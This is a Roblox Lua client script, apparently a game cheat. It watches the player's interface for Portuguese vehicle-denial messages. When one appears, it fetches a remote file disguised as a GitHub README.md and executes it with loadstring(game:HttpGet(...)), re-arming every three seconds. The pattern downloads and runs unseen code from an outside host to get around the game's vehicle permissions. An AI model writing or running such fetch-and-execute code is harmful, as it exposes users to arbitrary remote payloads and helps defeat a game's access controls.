-- Frases específicas que serão detectadas
local frasesEspecificas = {
    "Esse veículo de", -- parte fixa (o nome do jogador muda)
    "Você não pode entrar nesse carro agora!",
    "Você não tem permissão para dirigir esse veículo!",
    "Você deve consertar o veículo!"
}

-- Função para verificar se o texto corresponde a qualquer das frases
local function contemFraseAlvo(texto)
    texto = texto:lower()
    for _, frase in ipairs(frasesEspecificas) do
        if texto:find(frase:lower()) then
            return true
        end
    end
    return false
end

-- Previne execução múltipla por detecção
local executado = false

-- Monitorar mensagens no GUI
local function monitorarMensagens()
    local player = game.Players.LocalPlayer
    local gui = player:WaitForChild("PlayerGui")

    gui.DescendantAdded:Connect(function(desc)
        if desc:IsA("TextLabel") or desc:IsA("TextBox") or desc:IsA("TextButton") then
            desc:GetPropertyChangedSignal("Text"):Connect(function()
                if contemFraseAlvo(desc.Text) and not executado then
                    executado = true
                    print("Frase detectada. Executando script...")
                    pcall(function()
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/isaac7999/Hs/refs/heads/main/README.md"))()
                    end)
                    task.delay(3, function()
                        executado = false -- libera para nova execução
                    end)
                end
            end)
        end
    end)
end

-- Inicia o monitoramento
pcall(monitorarMensagens)
